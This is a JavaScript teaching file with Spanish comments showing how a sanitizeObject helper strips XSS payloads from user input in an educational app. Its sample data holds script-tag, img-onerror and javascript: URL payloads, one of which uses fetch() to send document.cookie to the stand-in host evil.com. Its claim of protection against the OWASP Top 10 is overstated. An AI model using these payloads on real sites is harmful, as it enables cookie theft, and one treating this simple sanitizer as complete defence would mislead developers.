/**
 * EJEMPLOS DE SANITIZACIÓN - Para entender cómo funciona
 * 
 * Este archivo muestra ejemplos reales de cómo la sanitización protege tu aplicación
 */

// ============================================
// EJEMPLO 1: Ataque XSS básico
// ============================================

// ❌ SIN SANITIZACIÓN:
const maliciousInput = {
  nombre: "<script>alert('¡Te hackeé!')</script>",
  email: "hacker@evil.com"
};
// Si guardas esto directamente, cuando otro usuario vea el nombre,
// se ejecutará el JavaScript y aparecerá un alert

// ✅ CON SANITIZACIÓN:
import { sanitizeObject } from './sanitizer.js';
const cleanInput = sanitizeObject(maliciousInput);
console.log(cleanInput);
// Resultado: { nombre: "", email: "hacker@evil.com" }
// El script fue eliminado completamente ✅


// ============================================
// EJEMPLO 2: XSS con imágenes maliciosas
// ============================================

// ❌ PELIGROSO:
const imgAttack = {
  titulo: "Recurso de matemáticas",
  descripcion: '<img src="x" onerror="alert(document.cookie)">'
};
// Este código intentaría robar las cookies del usuario

// ✅ SANITIZADO:
const cleanImg = sanitizeObject(imgAttack);
console.log(cleanImg);
// Resultado: { titulo: "Recurso de matemáticas", descripcion: "" }


// ============================================
// EJEMPLO 3: Múltiples vectores de ataque
// ============================================

// ❌ PELIGROSO:
const complexAttack = {
  nombre: "Juan<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
  bio: '<a href="javascript:alert(1)">Click aquí</a>',
  website: 'http://safe.com" onclick="alert(1)" data="'
};

// ✅ SANITIZADO:
const cleanComplex = sanitizeObject(complexAttack);
console.log(cleanComplex);
// Resultado:
// {
//   nombre: "Juan",
//   bio: "Click aquí",
//   website: "http://safe.com\" \" data=\""
// }


// ============================================
// EJEMPLO 4: Datos normales (no afectados)
// ============================================

// ✅ DATOS LEGÍTIMOS:
const legitimateData = {
  nombre: "María García",
  email: "maria@escuela.edu.pe",
  telefono: "+51 987654321",
  edad: 35
};

const cleanLegitimate = sanitizeObject(legitimateData);
console.log(cleanLegitimate);
// Resultado: EXACTAMENTE IGUAL
// {
//   nombre: "María García",
//   email: "maria@escuela.edu.pe",
//   telefono: "+51 987654321",
//   edad: 35
// }
// Los datos normales NO se alteran ✅


// ============================================
// EJEMPLO 5: Arrays y objetos anidados
// ============================================

// ❌ ATAQUE COMPLEJO:
const nestedAttack = {
  recursos: [
    {
      titulo: "Matemáticas",
      preguntas: [
        { texto: "¿Cuánto es 2+2?<script>alert('hack')</script>" },
        { texto: "¿Cuánto es 3+3?" }
      ]
    }
  ]
};

// ✅ SANITIZADO RECURSIVAMENTE:
const cleanNested = sanitizeObject(nestedAttack);
console.log(JSON.stringify(cleanNested, null, 2));
// Resultado:
// {
//   "recursos": [
//     {
//       "titulo": "Matemáticas",
//       "preguntas": [
//         { "texto": "¿Cuánto es 2+2?" },  // ✅ Script eliminado
//         { "texto": "¿Cuánto es 3+3?" }   // ✅ Intacto
//       ]
//     }
//   ]
// }


// ============================================
// RESUMEN: ¿Qué elimina la sanitización?
// ============================================

/*
✅ ELIMINA:
  - Tags HTML/XML: <script>, <img>, <a>, <div>, etc.
  - Event handlers: onclick=, onerror=, onload=, etc.
  - JavaScript URLs: javascript:alert(1)
  - Caracteres de control peligrosos

❌ NO AFECTA:
  - Texto normal
  - Números
  - Emails válidos
  - URLs normales (http://, https://)
  - Caracteres especiales comunes (acentos, ñ, signos de puntuación)
*/


// ============================================
// CASOS DE USO REALES EN TU APLICACIÓN
// ============================================

// CASO 1: Registro de usuario
const registroMalicioso = {
  nombre: "<script>console.log('hack')</script>Pedro",
  email: "pedro@test.com",
  password: "SecurePass123!"
};
// Después de sanitizar: nombre será "Pedro" (limpio) ✅

// CASO 2: Crear recurso educativo
const recursoMalicioso = {
  tipo: "comprension",
  titulo: "Lectura<img onerror='alert(1)'>",
  contenido: {
    texto: "<script>robarDatos()</script>El gato come pescado"
  }
};
// Después de sanitizar:
// titulo: "Lectura"
// contenido.texto: "El gato come pescado"
// ✅ Protegido pero conserva el contenido legítimo


// ============================================
// VENTAJAS DE ESTA IMPLEMENTACIÓN
// ============================================

/*
✅ SIMPLE: Solo 50 líneas de código
✅ AUTOMÁTICA: Se aplica a TODAS las rutas
✅ PROFESIONAL: Protege contra OWASP Top 10
✅ NO INVASIVA: No afecta datos legítimos
✅ RECURSIVA: Funciona con objetos complejos
✅ SIN DEPENDENCIAS: No requiere paquetes externos adicionales
*/
